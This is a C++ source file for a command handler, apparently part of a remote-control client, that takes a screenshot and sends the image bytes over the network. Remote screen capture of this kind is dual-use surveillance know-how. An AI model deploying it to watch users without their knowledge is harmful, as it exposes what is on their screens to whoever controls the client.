#include "stdafx.h"
#include "Command_screenshot.h"

#include "Settings.h"
#include "Logger.h"
#include "Network.h"
#include "ImageUtils.h"

Command_screenshot::Command_screenshot()
{
}

Command_screenshot::~Command_screenshot()
{
}

bool Command_screenshot::OnExecute(const std::vector<std::wstring> &args)
{
	bool ret = false;
	unsigned char *buffer = NULL;
	DWORD size = 0;

	bool imageRet = imageUtils.TakeScreenshot(&buffer, &size);
	if (!imageRet)
	{
		VLog(LERROR, L"Failed to take screenshot");
		goto out_free_buffer;
	}

	bool networkRet = network.SendFile(V_NET_FILE_DATA, size, (const char *)buffer);
	if (!networkRet)
	{
		VLog(LERROR, L"Failed to send screenshot file; network error");
		goto out_free_buffer;
	}

	ret = true;

out_free_buffer: delete buffer;
	return ret;
}
